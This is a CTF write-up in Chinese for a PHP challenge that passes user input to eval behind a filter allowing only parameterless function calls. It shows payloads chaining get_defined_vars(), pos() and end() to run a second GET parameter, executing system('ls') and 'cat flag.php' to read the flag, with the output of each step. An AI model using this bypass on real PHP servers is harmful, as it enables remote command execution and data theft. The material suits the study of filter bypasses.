## 题目
---

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

if (';' === preg_replace('/[^\W]+\((?R)?\)', '', $_GET['code'])){
	eval($_GET['code']);
}
?>
```



## `get_defined_vars()`
---

返回已定义变量数组

固定顺序：**GET → POST → COOKIE → FILES**。



## payload
---

```text
`?code=print_r(get_defined_vars());`
========
Array(
	[_GET] => Array ( 
		[code] => print_r(get_defined_vars()); 
	) 
	[_POST] => Array() 
	[_COOKIE] => Array()
	[_FILES] => Array()
)
========

`?code=print_r(get_defined_vars());&cmd=system('ls');`
========
Array(
	[_GET] => Array ( 
		[code] => print_r(get_defined_vars()); 
		[cmd] => system('ls'); 
	) 
	[_POST] => Array ( ) 
	[_COOKIE] => Array ( ) 
	[_FILES] => Array ( )
)
========

`?code=print_r(pos(get_defined_vars()));&cmd=system('ls');`
========
Array ( 
	[code] => print_r(pos(get_defined_vars())); 
	[cmd] => system('ls'); 
)
========

`?code=print_r(end(pos(get_defined_vars())));&cmd=system('ls');`
========
system('ls');
========

`?code=eval(end(pos(get_defined_vars())));&cmd=system('ls');`
========
1.php flag.php
========

`?code=eval(end(pos(get_defined_vars())));&cmd=system('cat flag.php');`
========
flag{this_is_a_flag}
========
```
